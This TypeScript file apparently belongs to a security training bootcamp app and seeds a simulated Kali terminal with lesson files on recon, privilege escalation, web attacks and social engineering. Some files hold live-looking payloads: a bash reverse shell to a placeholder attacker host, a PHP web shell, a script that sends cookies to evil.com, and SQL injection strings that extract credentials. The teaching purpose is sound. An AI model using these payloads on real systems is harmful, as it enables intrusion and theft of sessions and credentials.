import type { VFSNode, TerminalState } from '../types';

interface RoomFiles {
  name: string;
  content: string;
  permissions?: string;
}

const ROOM_FILE_MAP: Record<string, Record<string, RoomFiles[]>> = {
  phase1: {
    room1: [
      { name: 'notes.md', content: '# Introduction to Offensive Security\n\n## Key Concepts\n- Offensive vs Defensive security\n- Authorized penetration testing\n- Rules of engagement\n- Legal considerations\n\n## Mindset\nThink like an attacker, act like a defender.\nAlways ask: "How would I break this?"' },
      { name: 'targets.txt', content: '192.168.1.10  - Web server (Apache)\n192.168.1.11  - Database (MySQL)\n192.168.1.12  - File server (Samba)\n10.0.0.100    - Internal API' },
    ],
    room2: [
      { name: 'recon-checklist.txt', content: '# Reconnaissance Checklist\n\n1. [ ] Identify target IP ranges\n2. [ ] DNS enumeration\n3. [ ] Port scanning\n4. [ ] Service identification\n5. [ ] OS fingerprinting\n6. [ ] Vulnerability scanning\n7. [ ] Web application mapping' },
      { name: 'notes.md', content: '# Recon Notes\n\n## Passive Recon\n- WHOIS lookups\n- DNS records\n- Google dorking\n- Social media\n\n## Active Recon\n- Nmap scans\n- Service enumeration\n- Banner grabbing' },
    ],
    room3: [
      { name: 'exploit-notes.md', content: '# Exploitation Fundamentals\n\n## Types of Exploits\n- Remote Code Execution (RCE)\n- SQL Injection\n- Cross-Site Scripting (XSS)\n- Buffer Overflow\n- Privilege Escalation\n\n## Framework\n1. Identify vulnerability\n2. Research existing exploits\n3. Craft payload\n4. Test in safe environment\n5. Execute with authorization' },
      { name: 'payloads.txt', content: '# Common Payloads\n\n## Reverse Shell\nbash -i >& /dev/tcp/ATTACKER/PORT 0>&1\n\n## Web Shell\n<?php system($_GET[\"cmd\"]); ?>\n\n## SQL Injection\n\' OR 1=1--\nadmin\'--' },
    ],
    room4: [
      { name: 'report-template.md', content: '# Penetration Test Report\n\n## Executive Summary\n[High-level findings]\n\n## Scope\n[What was tested]\n\n## Methodology\n[How it was tested]\n\n## Findings\n### Critical\n### High\n### Medium\n### Low\n\n## Recommendations\n[Remediation steps]\n\n## Appendix\n[Tools used, raw data]' },
      { name: 'evidence.txt', content: '# Evidence Log\n\n| # | Finding | Severity | Screenshot | Notes |\n|---|---------|----------|------------|-------|\n| 1 |         |          |            |       |' },
    ],
  },
  phase2: {
    room1: [
      { name: 'linux-commands.txt', content: '# Essential Linux Commands\n\n## File System\nls -la          # List all files\ncd /path        # Change directory\npwd             # Print working directory\ncat file        # Read file\nchmod 755 file  # Change permissions\nchown user file # Change ownership\n\n## Process\nps aux          # List processes\ntop             # Process monitor\nkill -9 PID     # Kill process\n\n## Network\nifconfig        # Network interfaces\nnetstat -tlnp   # Listening ports\nip route        # Routing table' },
      { name: 'notes.md', content: '# Linux Fundamentals\n\n## File Permissions\n- rwx = Read, Write, Execute\n- Owner | Group | Others\n- chmod, chown, chgrp\n\n## Users and Groups\n- /etc/passwd - User database\n- /etc/shadow - Password hashes\n- /etc/group  - Group database' },
    ],
    room2: [
      { name: 'privilege-escalation.txt', content: '# Privilege Escalation Vectors\n\n## SUID Binaries\nfind / -perm -4000 2>/dev/null\n\n## Sudo Misconfig\nsudo -l\n\n## Kernel Exploits\nuname -a\nsearchsploit linux kernel\n\n## Crontab\nls -la /etc/cron*\ncat /etc/crontab\n\n## Writable /etc/passwd\nls -la /etc/passwd' },
      { name: 'wordlist.txt', content: 'password\n123456\nadmin\nroot\nletmein\ntest\nqwerty\nsecret\nmaster\nchangeme\nwelcome\nabc123\npassw0rd\nshadow' },
    ],
    room3: [
      { name: 'system-audit.txt', content: '# System Audit Checklist\n\n## Check System Info\nuname -a\ncat /etc/os-release\n\n## Check Users\nw\nwho\nid\n\n## Check Network\nifconfig\nnetstat -tlnp\n\n## Check Cron\nls -la /etc/cron*\n\n## Check SUID\nfind / -perm -4000 2>/dev/null' },
      { name: 'notes.md', content: '# System Enumeration Notes\n\n## Hostname: [fill in]\n## OS: [fill in]\n## Kernel: [fill in]\n## Current User: [fill in]\n## Groups: [fill in]' },
    ],
    room4: [
      { name: 'cleanup-checklist.txt', content: '# Post-Exploitation Cleanup\n\n1. [ ] Remove any backdoors\n2. [ ] Clear command history\n3. [ ] Remove uploaded files\n4. [ ] Restore modified configs\n5. [ ] Document all findings\n6. [ ] Generate report' },
      { name: 'report-data.txt', content: '# Post-Exploitation Evidence\n\n## Access Level Gained: [root/user]\n## Methods Used:\n- [ ] SUID binary\n- [ ] Sudo misconfiguration\n- [ ] Kernel exploit\n- [ ] Other: ___\n\n## Artifacts:\n- [ ] Flag captured\n- [ ] Sensitive data accessed\n- [ ] Lateral movement' },
    ],
  },
  phase3: {
    room1: [
      { name: 'network-scan.txt', content: '# Network Scan Results\n\nNmap scan report for 192.168.1.0/24\n\nHost: 192.168.1.1   - Gateway (Cisco)\nHost: 192.168.1.10  - Web Server (Apache)\nHost: 192.168.1.11  - Database (MySQL)\nHost: 192.168.1.12  - File Server (Samba)\nHost: 192.168.1.20  - Workstation\nHost: 192.168.1.50  - Printer\nHost: 192.168.1.100 - IoT Device' },
      { name: 'notes.md', content: '# Networking Fundamentals\n\n## TCP/IP Model\n1. Application Layer\n2. Transport Layer (TCP/UDP)\n3. Internet Layer (IP)\n4. Network Access Layer\n\n## Common Ports\n- 22: SSH\n- 80: HTTP\n- 443: HTTPS\n- 3306: MySQL\n- 5432: PostgreSQL' },
    ],
    room2: [
      { name: 'packet-analysis.txt', content: '# Packet Analysis Notes\n\n## Key Filters\n- tcp.port == 80\n- ip.src == 192.168.1.10\n- http.request.method == POST\n- tcp.flags.syn == 1\n\n## Suspicious Patterns\n- Beaconing (regular intervals)\n- Large data transfers\n- DNS tunneling\n- Unusual ports' },
      { name: 'capture-info.txt', content: '# Capture File Info\n\nFile: traffic-capture.pcap\nPackets: 15,234\nDuration: 300 seconds\nProtocols: TCP, UDP, HTTP, DNS\n\nNotable:\n- HTTP POST to /login with cleartext credentials\n- DNS queries to suspicious domain\n- SSH brute force attempt' },
    ],
    room3: [
      { name: 'firewall-rules.txt', content: '# Firewall Rule Analysis\n\nChain INPUT (policy ACCEPT)\n-target     prot opt source       destination\nACCEPT      tcp  --  0.0.0.0/0    0.0.0.0/0   tcp dpt:22\nACCEPT      tcp  --  0.0.0.0/0    0.0.0.0/0   tcp dpt:80\nACCEPT      tcp  --  0.0.0.0/0    0.0.0.0/0   tcp dpt:443\nDROP        tcp  --  0.0.0.0/0    0.0.0.0/0   tcp dpt:3306\nDROP        all  --  0.0.0.0/0    0.0.0.0/0' },
      { name: 'bypass-notes.txt', content: '# Firewall Bypass Techniques\n\n1. IP Fragmentation\n2. Source Port Manipulation\n3. DNS Tunneling\n4. ICMP Tunneling\n5. Encrypted Channels\n6. Protocol Downgrade' },
    ],
    room4: [
      { name: 'network-report.md', content: '# Network Security Assessment\n\n## Scope\n192.168.1.0/24 subnet\n\n## Findings\n### Critical\n- Cleartext credentials in HTTP traffic\n\n### High\n- DNS queries to known malicious domain\n\n### Medium\n- Open ports without need\n- Weak firewall rules\n\n## Recommendations\n- Implement TLS\n- Enable DNS filtering\n- Tighten firewall rules' },
    ],
  },
  phase4: {
    room1: [
      { name: 'web-targets.txt', content: '# Web Application Targets\n\n1. http://10.0.0.50/        - Corporate Portal\n2. http://10.0.0.50/login   - Login Page\n3. http://10.0.0.50/search  - Search Function\n4. http://10.0.0.50/api/v1   - REST API\n5. http://10.0.0.50/admin    - Admin Panel' },
      { name: 'notes.md', content: '# Web Application Security\n\n## OWASP Top 10\n1. Injection\n2. Broken Authentication\n3. Sensitive Data Exposure\n4. XML External Entities\n5. Broken Access Control\n6. Security Misconfiguration\n7. XSS\n8. Insecure Deserialization\n9. Known Vulnerabilities\n10. Insufficient Logging' },
    ],
    room2: [
      { name: 'sqli-notes.txt', content: '# SQL Injection Notes\n\n## Types\n- Union-Based\n- Error-Based\n- Blind (Boolean/Time)\n- Second-Order\n\n## Detection\n\' OR 1=1--\n\' UNION SELECT NULL--\n\' AND SLEEP(5)--\n\n## Exploitation\n\' UNION SELECT username,password FROM users--\n\' UNION SELECT table_name FROM information_schema.tables--' },
      { name: 'injectable-params.txt', content: '# Injectable Parameters\n\n## Login Form\n- username: POST parameter\n- password: POST parameter\n- vulnerable to: Union-Based SQLi\n\n## Search\n- q: GET parameter\n- vulnerable to: Error-Based SQLi\n\n## API\n- id: GET parameter\n- vulnerable to: Blind SQLi' },
    ],
    room3: [
      { name: 'xss-payloads.txt', content: '# XSS Payloads\n\n## Reflected\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n\n## Stored\n<script>document.location=\'http://evil.com/steal?c=\'+document.cookie</script>\n\n## DOM-based\njavascript:alert(1)\n<details open ontoggle=alert(1)>' },
      { name: 'csrf-notes.txt', content: '# CSRF Notes\n\n## Attack Flow\n1. Victim authenticated to target\n2. Victim visits attacker page\n3. Attacker page sends request to target\n4. Request includes victim cookies\n\n## Defense\n- CSRF tokens\n- SameSite cookies\n- Origin validation' },
    ],
    room4: [
      { name: 'vulnerability-report.md', content: '# Web Application Vulnerability Report\n\n## Target: Corporate Portal\n\n## Findings\n### SQL Injection (Critical)\n- Location: /login username parameter\n- Type: Union-Based\n- Impact: Full database access\n\n### XSS (High)\n- Location: /search q parameter\n- Type: Reflected\n- Impact: Session hijacking\n\n### CSRF (Medium)\n- Location: /admin/settings\n- Impact: Account takeover' },
    ],
  },
  phase5: {
    room1: [
      { name: 'phishing-emails.txt', content: '# Phishing Email Analysis\n\n## Email 1: Credential Harvest\nFrom: security@qyvora-support.com\nSubject: Urgent: Password Expiration\nIndicators:\n- Spoofed domain (qyvora-support.com)\n- Urgency language\n- Mismatched reply-to\n\n## Email 2: Malware Delivery\nFrom: invoice@quickbooks-notify.net\nSubject: Invoice #4821\nIndicators:\n- Suspicious attachment (.exe disguised as .pdf)\n- Generic greeting\n- Unknown sender domain' },
      { name: 'indicators.txt', content: '# Social Engineering Indicators\n\n## Red Flags\n- Urgency/panic language\n- Too good to be true\n- Requests for credentials\n- Suspicious sender domains\n- Mismatched URLs\n- Generic greetings\n- Unexpected attachments\n- Pressure to bypass procedures' },
    ],
    room2: [
      { name: 'osint-targets.txt', content: '# OSINT Investigation Targets\n\n## Company: NovaCorp\n- Website: novacorp.com\n- LinkedIn: NovaCorp Inc\n- GitHub: github.com/novacorp\n- DNS: novacorp.com\n\n## Key Personnel\n- CEO: John Smith (LinkedIn)\n- IT Admin: jane.doe (GitHub)\n- Support: support@novacorp.com' },
      { name: 'osint-tools.txt', content: '# OSINT Tools\n\n## Reconnaissance\n- theHarvester (email/domain)\n- Maltego (relationship mapping)\n- Shodan (IoT/infrastructure)\n\n## Social Media\n- Sherlock (username search)\n- Social Analyzer\n\n## DNS/Infrastructure\n- dig, nslookup\n- whois\n- crt.sh (certificate transparency)' },
    ],
    room3: [
      { name: 'social-engineering.txt', content: '# Social Engineering Techniques\n\n## Pretexting\nCreating a believable scenario\nExample: "I\'m from IT support, we need to reset your password"\n\n## Phishing\nMass email campaigns\n- Spear phishing (targeted)\n- Whaling (executives)\n- Vishing (voice)\n\n## Baiting\nLeaving infected USB drives\n\n## Tailgating\nFollowing authorized personnel through secure doors' },
      { name: 'defense-notes.txt', content: '# Defense Against Social Engineering\n\n## Awareness\n- Security training\n- Phishing simulations\n- Clear reporting procedures\n\n## Technical\n- Email filtering (SPF/DKIM/DMARC)\n- MFA enforcement\n- URL filtering\n\n## Process\n- Verification procedures\n- Least privilege\n- Incident response plan' },
    ],
    room4: [
      { name: 'final-report.md', content: '# Social Engineering Assessment Report\n\n## Executive Summary\nThis assessment tested employee susceptibility to social engineering attacks across three vectors: phishing, pretexting, and physical access.\n\n## Results\n- Phishing click rate: 34%\n- Credential submission: 22%\n- Pretexting success: 15%\n\n## Recommendations\n1. Implement mandatory security awareness training\n2. Deploy advanced email filtering\n3. Conduct regular phishing simulations\n4. Establish clear incident reporting procedures' },
    ],
  },
};

function getDefaultFiles(bootcampId: string, phaseId?: string, roomId?: string): RoomFiles[] {
  return [
    { name: 'README.md', content: `# ${bootcampId} Bootcamp\n\nPhase: ${phaseId || 'N/A'}\nRoom: ${roomId || 'N/A'}\n\nThis directory contains target configurations and\nvulnerability assessment scenarios for your current\nbootcamp phase.` },
    { name: 'targets.txt', content: '192.168.1.10  - Web server (Apache 2.4.57)\n192.168.1.11  - Database server (MySQL 8.0)\n192.168.1.12  - File server (Samba 4.18)\n10.0.0.100    - Internal API (Node.js/Express)' },
    { name: 'wordlist.txt', content: 'admin\nroot\nadministrator\nbackup\ntest\nuser\nmanager\nadmin2024\npassword123\nqyvora\nletmein\nwelcome\nsecret' },
  ];
}

export function injectBootcampContent(
  state: TerminalState,
  bootcampId: string,
  phaseId?: string,
  roomId?: string,
): TerminalState {
  const root = { ...state.root };

  let projectsDir = root.children.find(c => c.name === 'home');
  if (!projectsDir) return state;
  let homeDir = projectsDir.children.find(c => c.name === 'kali');
  if (!homeDir) return state;
  let projectsNode = homeDir.children.find(c => c.name === 'Projects');
  if (!projectsNode) return state;

  const roomFiles = (phaseId && roomId && ROOM_FILE_MAP[phaseId]?.[roomId]) || getDefaultFiles(bootcampId, phaseId, roomId);

  const bootcampDir: VFSNode = {
    name: 'hpb-targets',
    type: 'dir',
    children: roomFiles.map(f => ({
      name: f.name,
      type: 'file' as const,
      content: f.content,
      permissions: f.permissions || '-rw-r--r--',
      owner: 'kali',
      group: 'kali',
      size: f.content.length,
      children: [],
    })),
    permissions: 'drwxr-xr-x',
    owner: 'kali',
    group: 'kali',
    size: 4096,
  };

  projectsNode.children = [...projectsNode.children, bootcampDir];

  return {
    ...state,
    root,
    env: {
      ...state.env,
      HPB_TARGETS: '/home/kali/Projects/hpb-targets/targets.txt',
      HPB_WORDLIST: '/home/kali/Projects/hpb-targets/wordlist.txt',
    },
  };
}
